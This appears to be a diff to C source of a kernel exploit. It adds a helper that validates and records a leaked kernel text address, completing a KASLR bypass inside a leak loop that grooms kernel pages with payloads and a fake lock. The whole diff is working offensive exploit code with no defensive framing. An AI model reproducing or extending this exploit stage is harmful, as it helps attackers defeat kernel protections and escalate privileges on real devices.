@@ -474,7 +474,34 @@ uint64_t slide_child_leak_stext(void) {
   return slide_read_stext();
 }
 
+static int slide_commit_stext(uint64_t stext, const char *source) {
+  if (stext < KIMAGE_TEXT_BASE) {
+    return 0;
+  }
+  uint64_t slide = stext - KIMAGE_TEXT_BASE;
+  if (slide > 0x1f0000ULL || (slide & 0xffffULL) != 0) {
+    pr_warning("slide rejected source=%s stext=%016llx slide=%016llx\n",
+               source, (unsigned long long)stext,
+               (unsigned long long)slide);
+    return 0;
+  }
+  kaslr_base = stext;
+  kaslr_slide = slide;
+  slide_p0_offset = slide;
+  kaslr_done = 1;
+  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
+             "slide=%016llx\n",
+             source, getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide);
+  return 1;
+}
+
 int slide_leak_kernel_base(void) {
+  uint64_t existing_stext = slide_read_stext();
+  if (existing_stext && slide_commit_stext(existing_stext, "boot_id")) {
+    return 1;
+  }
+
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
@@ -515,13 +542,9 @@ int slide_leak_kernel_base(void) {
       continue;
     }
 
-    kaslr_base = stext;
-    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
-    kaslr_done = 1;
-    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
-               getpid(), (unsigned long long)kaslr_base,
-               (unsigned long long)kaslr_slide);
-    return 1;
+    if (slide_commit_stext(stext, "pselect")) {
+      return 1;
+    }
   }
 
   return 0;
